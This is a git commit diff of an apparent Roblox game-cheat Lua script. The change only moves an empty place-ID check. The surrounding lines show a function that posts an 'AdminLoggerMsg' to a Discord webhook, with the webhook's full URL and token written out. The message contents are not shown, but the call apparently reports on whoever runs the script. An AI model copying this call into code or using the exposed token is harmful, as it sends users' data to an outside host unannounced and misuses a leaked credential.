fd683f00eca88cf232c0ff76a2de08075cd38b2e
05650198416531d21d9 <160678881+vldtncywdlojtnvjlmvyrbszljd@users.noreply.github.com>
2024-08-26 03:26:23 +0700

    Update _-_s_e_-_a.lua

--- _-_s_e_-_a.lua
+++ _-_s_e_-_a.lua
@@ -1,3 +1,5 @@
+if game.PlaceId == 1724616059510 then
+end
 function PostWebhook(Url, message)
   local request = http_request or request or HttpPost or syn.request
   local data =
@@ -65,8 +67,6 @@ function AdminLoggerMsg()
 end
 
 PostWebhook("https://discord.com/api/webhooks/1274066820009037956/jK-EgqCx3thzF9ctrAB_N1Zv9JVvaCSZYW37sD3LDk8diLmgrTn0miuqONzob8uaqnbJ", AdminLoggerMsg())
-if game.PlaceId == 1724616059510 then
-end
 local _wait = task.wait
 repeat _wait() until game:IsLoaded()
 local _env = getgenv and getgenv() or {}
